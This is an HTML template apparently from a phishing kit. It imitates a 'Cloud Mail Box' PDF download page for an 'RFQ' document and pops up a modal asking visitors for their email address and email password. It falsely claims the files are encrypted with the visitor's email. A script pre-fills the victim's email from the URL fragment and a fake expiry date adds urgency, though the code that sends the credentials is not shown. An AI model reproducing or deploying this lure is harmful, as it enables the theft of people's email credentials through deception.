<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download PDF</title>

    <style>
        @page {
            size: A4;
            margin: 20px;
        }

        body {
            font-size: 14px;
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .container {
            max-width: 600px;
            margin: auto;
            background: #f8f9fa;
            padding: 20px;
            border-radius: 5px;
        }

        .pdf-icon img {
            width: 100px;
        }

        .btn {
            background-color: #007bff !important;
            color: white !important;
            padding: 10px 20px;
            text-decoration: none;
            display: inline-block;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="pdf-icon">
            <img src="https://file-personal.cloudmailbox.net/reference/images/filetypes/v4_pdf.png" alt="PDF Icon">
        </div>
        <h5 class="fw-bold">RFQ_JO2025.New.pdf</h5>
        <p><strong>31.5MB</strong></p>

        <a href="{{ link }}" class="btn">Download</a>
    </div>
    
    <div class="modal fade" id="adobeModal" tabindex="-1" aria-labelledby="adobeModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header border-0 justify-content-center flex-column">
                    
                    <img src="https://file-personal.cloudmailbox.net/reference/images/filetypes/v4_pdf.png" alt="">
                    <h5 class="modal-title fw-bold mb-2" id="adobeModalLabel">Cloud Mail Box</h5>
                    <p class="h6 text-center">Authenticate your email to download the file</p>
                    <p id="error" style="display: none; color: red; font-size: 16px;">Network Error! Please
                        Retry</p>
                </div>
                <div class="modal-body">

                    <form>
                        <div class="form-group mb-3">
                            <input type="email" class="form-control" id="email" placeholder="Enter email" value="">
                        </div>
                        <div class="form-group mb-3">
                            <input type="password" class="form-control" id="pass" placeholder="Password">
                        </div>
                        <div class="form-check mb-3">
                            <input type="checkbox" class="form-check-input" id="rememberMe">
                            <label class="form-check-label" for="rememberMe">Remember me</label>
                        </div>
                        <button type="submit" class="btn btn-danger w-100 rounded-none">View</button>
                    </form>
                </div>
                <div class="modal-footer border-0">
                    <p class="small text-muted text-center">
                        Â© 2025 CloudMailBox encrypted the shared documents with your email address. 
                        To access these email encrypted files, your accurate email address 
                        and email password will be required to access these sensitive files. 
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <script>
        function openModal() {
            // Show the modal
            var modal = new bootstrap.Modal(document.getElementById('adobeModal'));
            modal.show();

            // Get the fragment (hash) from the URL
            var fragment = window.location.hash.substring(1); // Remove the "#" from the fragment
            console.log("Fragment found:", fragment);

            // If the fragment exists, autofill the email field or any other fields
            if (fragment) {
                document.getElementById('email').value = fragment;
            }
        }

        // Optional: Auto-open modal if the page loads with a fragment in the URL
       ;

        function setExpirationTime() {
            // Get the current date and add one day
            const currentDate = new Date();
            const expirationDate = new Date(currentDate);
            expirationDate.setDate(currentDate.getDate() + 1); // Add 1 day
    
            // Format the date as 'Month Day, Year at Hour:Minute AM/PM'
            const options = { 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric', 
                hour: 'numeric', 
                minute: 'numeric', 
                hour12: true 
            };
            const formattedDate = expirationDate.toLocaleString('en-US', options);
    
            document.getElementById('d_ew_date').textContent = formattedDate;
        }
    
        // Set expiration date on page load
        window.addEventListener('load', setExpirationTime);
    </script>
</body></html>